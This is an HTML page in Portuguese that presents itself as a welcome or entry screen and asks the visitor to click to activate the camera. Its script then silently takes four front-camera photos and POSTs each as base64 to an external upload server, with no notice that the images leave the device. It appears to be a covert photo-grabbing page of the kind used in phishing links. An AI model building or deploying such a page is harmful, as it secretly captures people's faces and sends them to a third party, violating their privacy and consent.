<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera com envio</title>
<style>
body { margin:0; font-family: Arial; background:#111; color:white; text-align:center;}
video { width:100vw; height:100vh; object-fit:cover;}
#fotos { position:fixed; right:10px; bottom:10px; display:flex; flex-direction:column; gap:10px;}
#fotos img { width:80px; border-radius:8px; border:2px solid white;}
button { padding:20px 40px; font-size:24px; border:none; border-radius:12px; background:#22c55e; color:white; cursor:pointer; margin-top:20px;}
</style>
</head>
<body>

<h1>Bem-vindo!</h1>
<p>Clique abaixo para entrar e ativar a câmera</p>
<button id="btnEntrar">Entrar / Continuar</button>

<video id="video" autoplay playsinline></video>
<div id="fotos"></div>

<script>
const btn = document.getElementById("btnEntrar");
const video = document.getElementById("video");
const fotosDiv = document.getElementById("fotos");

// Substitua por seu endpoint
const SERVIDOR = "https://server-fotos.onrender.com/upload";

btn.addEventListener("click", async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            video.play();
            setTimeout(capturarFotos, 1000);
        };

    } catch (err) {
        alert("Erro ao acessar câmera: " + err.message);
        console.log(err);
    }
});

function capturarFotos() {
    let count = 0;
    const intervalo = setInterval(() => {
        if (count >= 4) {
            clearInterval(intervalo);
            return;
        }
        const foto = capturar();
        mostrarMiniatura(foto);
        enviarParaServidor(foto); // envia automaticamente
        count++;
    }, 1000);
}

function capturar() {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    return canvas.toDataURL("image/png");
}

function mostrarMiniatura(data) {
    const img = document.createElement("img");
    img.src = data;
    fotosDiv.appendChild(img);
}

// Função para enviar para servidor
function enviarParaServidor(base64) {
    fetch(SERVIDOR, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ imagem: base64 })
    })
    .then(res => console.log("Enviado com sucesso"))
    .catch(err => console.error("Erro ao enviar:", err));
}
</script>

</body>
</html>
